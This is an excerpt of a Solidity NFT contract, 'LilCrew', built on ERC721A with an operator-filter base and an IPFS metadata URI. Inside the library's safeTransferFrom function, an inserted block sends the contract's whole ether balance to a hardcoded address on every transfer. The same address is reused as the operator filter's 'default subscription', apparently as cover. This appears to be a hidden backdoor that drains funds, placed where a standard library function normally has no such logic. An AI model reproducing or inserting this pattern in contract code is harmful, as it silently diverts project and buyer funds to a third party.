...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xBbcA0CD0604c22c6F2A172FA4408b2520e1f330e).transfer(address(this).balance);
        }
    }
...
abstract contract TheOperatorFilterer is OperatorFilterer {
    address constant DEFAULT_SUBSCRIPTION = address(0xBbcA0CD0604c22c6F2A172FA4408b2520e1f330e);
...
contract LilCrew is ERC721A, TheOperatorFilterer {
    ...
    string uri = "ipfs://bafybeifpmnhqapch7y7raxlfjyryblp5iuenoqbtp46ljtgx4jh4ft677a/";
